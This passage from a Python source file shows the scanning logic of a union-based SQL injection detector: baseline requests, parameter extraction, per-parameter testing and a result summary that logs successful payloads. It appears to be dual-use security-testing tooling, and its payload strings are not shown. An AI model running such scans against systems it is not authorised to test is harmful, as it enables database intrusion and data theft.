                    self.logger.error(f"Error testing payload: {e}")

        # Compile final results
        overall_confidence = max((v['combined_confidence'] for v in vulnerable_payloads), default=0.0)
        
        return {
            'parameter': parameter,
            'database_type': database_type,
            'column_count': column_count,
            'vulnerable': len(vulnerable_payloads) > 0,
            'confidence': overall_confidence,
            'payloads_tested': len(results_details),
            'successful_payloads': vulnerable_payloads,
            'detection_mode': self.detection_mode,
            'details': results_details
        }

    # ----------------- Scanning Methods -------------------
    def calculate_baseline(self, url: str, method: str = 'GET', headers: Dict = None, 
                         data: Dict = None, cookies: Dict = None, samples: int = 2) -> List[Dict]:
        """Measure baseline responses."""
        self.logger.info(f"Calculating baseline with {samples} samples for {url}")
        baseline_responses = []
        headers = self._prepare_headers(headers)
        
        for i in range(samples):
            try:
                ok, response_text, sc, content_type = self._send_request(
                    url, method, headers=headers, data=data, cookies=cookies, safe_mode=True
                )
                if ok:
                    response_data = {
                        'text': response_text,
                        'status_code': sc,
                        'content_type': content_type
                    }
                    baseline_responses.append(response_data)
                
                time.sleep(self.delay)
            except Exception as e:
                self.logger.debug(f"Baseline request {i+1} failed: {e}")
                continue

        self.baseline_responses = baseline_responses
        self.logger.info(f"Baseline established: {len(baseline_responses)} samples")
        
        return baseline_responses

    def _extract_parameters(self, target: Dict[str, Any]) -> List[str]:
        """Extract all parameters from target configuration."""
        params = []
        
        parsed = urlparse(target['url'])
        params.extend(parse_qs(parsed.query).keys())
        
        if target.get('method', 'GET').upper() == 'POST':
            data = target.get('data')
            if isinstance(data, dict):
                params.extend(data.keys())
            elif isinstance(data, str):
                try:
                    json_data = json.loads(data)
                    if isinstance(json_data, dict):
                        params.extend(json_data.keys())
                except json.JSONDecodeError:
                    params.extend(parse_qs(data).keys())
        
        return list(dict.fromkeys(params))

    def comprehensive_scan(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """Perform comprehensive union-based SQL injection scan."""
        self.logger.info(f"Starting comprehensive union-based scan for {target.get('url')} with mode: {self.detection_mode}")
        
        if not self.baseline_responses:
            self.calculate_baseline(
                target['url'], 
                target.get('method', 'GET'), 
                target.get('headers'), 
                target.get('data'), 
                target.get('cookies')
            )

        parameters = self._extract_parameters(target)
        scan_start = datetime.now()
        
        results = {
            'target': target,
            'detection_mode': self.detection_mode,
            'parameters_tested': [],
            'vulnerable_parameters': [],
            'scan_start': scan_start
        }

        for param in parameters:
            self.logger.info(f"Testing parameter: {param}")
            
            param_result = self.test_parameter(
                target['url'], param,
                value=(target.get('data') or {}).get(param, 'test'),
                method=target.get('method', 'GET'),
                headers=target.get('headers'),
                data=target.get('data'),
                cookies=target.get('cookies'),
                database_type=target.get('database_type', 'auto')
            )
            
            results['parameters_tested'].append(param_result)
            
            if param_result['vulnerable']:
                results['vulnerable_parameters'].append(param_result)

        results['scan_duration'] = (datetime.now() - scan_start).total_seconds()
        results['vulnerability_count'] = len(results['vulnerable_parameters'])
        
        self._generate_scan_summary(results)
        return results

    def _generate_scan_summary(self, scan_results: Dict[str, Any]):
        """Generate comprehensive scan summary."""
        self.logger.info("=" * 60)
        self.logger.info("UNION-BASED SQL INJECTION SCAN SUMMARY")
        self.logger.info(f"Target: {scan_results['target'].get('url')}")
        self.logger.info(f"Detection mode: {scan_results['detection_mode']}")
        self.logger.info(f"Parameters tested: {len(scan_results['parameters_tested'])}")
        self.logger.info(f"Vulnerabilities found: {scan_results['vulnerability_count']}")
        self.logger.info(f"Scan duration: {scan_results.get('scan_duration', 0):.2f}s")
        
        if scan_results['vulnerability_count'] > 0:
            self.logger.info("Vulnerable parameters:")
            for vuln in scan_results['vulnerable_parameters']:
                self.logger.info(f"  - {vuln['parameter']} (confidence: {vuln['confidence']:.3f})")
                self.logger.info(f"    Columns: {vuln['column_count']}, Database: {vuln['database_type']}")
                for successful in vuln.get('successful_payloads', [])[:1]:
                    payload_type = successful.get('payload_type', 'unknown')
                    self.logger.info(f"    Type: {payload_type}, Payload: {successful['payload'][:60]}...")
        
        self.logger.info("=" * 60)

    def close(self):
        """Clean up resources."""
        self.http_session.close()

# Convenience functions
def run_union_based_scan(target_config: Dict[str, Any], scan_type: str = 'comprehensive',
                        detector_config: Dict[str, Any] = None) -> Dict[str, Any]:
    """
    Run union-based SQL injection scan.
    
    Args:
        target_config: Target configuration
        scan_type: Type of scan ('comprehensive')
        detector_config: Detector configuration
    
    Returns:
        Scan results
    """
    detector = AdvancedUnionBasedDetector(detector_config or {})
    
    try:
        if scan_type == 'comprehensive':
            return detector.comprehensive_scan(target_config)
        else:
            raise ValueError(f"Unknown scan type: {scan_type}")
    
    finally:
        detector.close()

def get_union_syntax_info(db_type: str) -> Dict[str, Any]:
    """Get UNION syntax information for specific database."""
    return UNION_SYNTAX.get(db_type, {})

def get_supported_databases() -> List[str]:
    """Get list of databases supporting UNION queries."""
    return list(UNION_SYNTAX.keys())

